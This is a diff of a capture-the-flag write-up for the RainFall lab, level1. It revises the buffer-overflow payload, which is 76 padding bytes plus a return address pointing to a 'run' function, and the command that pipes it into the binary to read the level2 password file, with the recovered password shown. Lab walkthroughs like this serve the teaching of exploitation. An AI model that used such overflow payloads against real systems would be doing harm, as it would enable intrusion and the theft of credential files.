@@ -51,11 +51,8 @@ Non-debugging symbols:
 
 Let's craft our payload:
 ```bash
-64 bytes + 12 bytes = 76 bytes
-\x08\x04\x84\x44 = 0x08048444 address of run function
-
-level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && cat) | ./level1
-cat /home/user/level2/.pass
+level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && echo 'cat /home/user/level2/.pass') | ./level1
+Good... Wait what?
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
